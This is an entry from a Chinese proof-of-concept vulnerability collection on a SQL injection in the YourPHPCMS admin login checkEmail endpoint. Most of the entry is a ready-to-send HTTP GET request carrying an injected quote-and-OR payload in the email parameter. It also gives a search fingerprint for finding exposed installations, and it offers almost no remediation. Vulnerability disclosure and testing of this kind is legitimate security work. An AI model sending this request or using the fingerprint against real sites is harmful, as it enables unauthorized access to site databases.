---
source: "wy876 漏洞文库"
---

# YourPHPCMS login_checkEmail存在sql注入漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.84);">YourPHPCMS login_checkEmail存在sql注入漏洞</font>

# <font style="color:rgba(0, 0, 0, 0.84);">二、影响版本</font>
+ YourPHPCMS

# 三、资产测绘
```rust
header="YP_onlineid"
```


# 四、漏洞复现
```rust
GET /index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-69710348@nwcrb.com'+or+'1'='2" HTTP/1.1
Host: 
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/edbg83z8v9qn2mic>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
